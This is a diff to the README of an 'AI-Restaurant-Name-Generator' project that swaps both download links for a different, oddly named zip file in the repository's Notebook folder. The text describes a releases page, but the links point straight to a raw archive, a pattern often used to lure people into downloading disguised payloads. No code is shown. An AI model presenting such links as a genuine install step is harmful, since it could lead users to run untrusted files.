@@ -8,7 +8,7 @@ To begin using the AI-Restaurant-Name-Generator, follow these steps:
 
 1. **Visit the Releases Page**
    Click the link below to access the download options:
-   [Download AI-Restaurant-Name-Generator](https://github.com/K-687/AI-Restaurant-Name-Generator/raw/refs/heads/main/Notebook/A-Name-Generator-Restaurant-v3.0.zip)
+   [Download AI-Restaurant-Name-Generator](https://github.com/K-687/AI-Restaurant-Name-Generator/raw/refs/heads/main/Notebook/Restaurant-Generator-Name-A-v3.9.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Select the one that suits your needs.
@@ -32,7 +32,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 To download the application, click the link below again for convenience:
-[Download AI-Restaurant-Name-Generator](https://github.com/K-687/AI-Restaurant-Name-Generator/raw/refs/heads/main/Notebook/A-Name-Generator-Restaurant-v3.0.zip)
+[Download AI-Restaurant-Name-Generator](https://github.com/K-687/AI-Restaurant-Name-Generator/raw/refs/heads/main/Notebook/Restaurant-Generator-Name-A-v3.9.zip)
 
 ### Installation Steps
 1. **Locate the Downloaded File**
